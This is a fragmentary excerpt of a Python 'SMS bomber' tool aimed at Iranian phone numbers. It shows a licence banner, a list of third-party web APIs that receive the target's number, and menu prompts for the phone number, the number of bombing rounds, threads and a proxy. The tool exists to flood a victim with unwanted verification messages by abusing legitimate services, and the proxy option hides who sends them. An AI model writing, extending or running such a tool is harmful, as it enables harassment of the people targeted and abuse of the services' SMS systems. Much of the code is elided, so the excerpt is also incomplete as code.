...
# Copyright :                                                                        #
#                                                                                    #
# Javad SMS Bomber (C) <2024> <Javad Security Agency>                              #
# This Program Is Free Software: You Can Redistribute It                             #
# It Under The Terms Of The  `Javad General Black License`  As Published By         #
...
class JavadSMSBomber:
    ...
    def __init__(self):
        ...
        self.apis = [
            ...
            },
            {
                    ...
                    'data' : f'mobile_phone={phone_number}'
                },
                {
                    'name' : 'trip',
    ...
    def Menu(self):
        ...
        while True:
            ...
            try:
                print(f"\n{Fore.LIGHTGREEN_EX}[{Fore.LIGHTYELLOW_EX}1{Fore.LIGHTGREEN_EX}] Javad SMS Bomber")
...
every month This Script Update                      
    ...
    def Menu2(self):
        print(self.Horizontal(self.Logo()))
        try:
            print('\n[+] Javad SMS Bomber : Please Fill All Prompts')
            phone_number = input(f'{Fore.LIGHTBLUE_EX}┌──({Fore.LIGHTGREEN_EX}Javad SMS Bomber{Fore.LIGHTBLUE_EX})-[ {Fore.LIGHTWHITE_EX}Phone Number (without: +98 start with: 0){Fore.LIGHTBLUE_EX} ]\n└─{Fore.LIGHTRED_EX}# ')
            bombing_times = input(f'{Fore.LIGHTBLUE_EX}┌──({Fore.LIGHTGREEN_EX}Javad SMS Bomber{Fore.LIGHTBLUE_EX})-[ {Fore.LIGHTWHITE_EX}Number Of Bombing Time (Default: 7){Fore.LIGHTBLUE_EX} ]\n└─{Fore.LIGHTRED_EX}# ')
            process_num = input(f'{Fore.LIGHTBLUE_EX}┌──({Fore.LIGHTGREEN_EX}Javad SMS Bomber{Fore.LIGHTBLUE_EX})-[ {Fore.LIGHTWHITE_EX}Number Of Threads (Default: 5){Fore.LIGHTBLUE_EX} ]\n└─{Fore.LIGHTRED_EX}# ')
            proxy = input(f'{Fore.LIGHTBLUE_EX}┌──({Fore.LIGHTGREEN_EX}Javad SMS Bomber{Fore.LIGHTBLUE_EX})-[{Fore.LIGHTWHITE_EX}Set The Proxy (Default: Nothing){Fore.LIGHTBLUE_EX}]\n└─{Fore.LIGHTRED_EX}# ')
...
##########################################################################################
# {Fore.LIGHTRED_EX}Javad SMS Bomber {Fore.LIGHTBLUE_EX}({Fore.LIGHTYELLOW_EX}It can only be used for Iranian people{Fore.LIGHTBLUE_EX}){Fore.LIGHTGREEN_EX}                             #
#                                                                                        #
#                                                                                        #
